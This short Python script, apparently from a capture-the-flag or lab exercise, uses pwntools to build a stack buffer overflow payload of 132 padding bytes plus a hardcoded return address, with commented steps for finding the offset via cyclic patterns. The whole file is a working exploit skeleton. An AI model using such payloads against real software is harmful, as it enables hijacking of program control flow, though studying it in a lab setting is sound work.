import sys
from pwn import *

# print = lambda *args, **kwargs: None # override print function


# Generate a 528-byte cyclic pattern to identify the return address position (if needed)
# print(cyclic(200))  # Generate a 1000-byte cyclic pattern

# crash_addr = 0x62616169
# print(cyclic_find(crash_addr))  # Uncomment to find the offset
# For this case, ret-address is at offset 132
ret_addr_pos = 132
ret_addr = 0xffffd543

payload = ret_addr_pos * b'a'
payload += p32(ret_addr)

sys.stdout.buffer.write(payload)
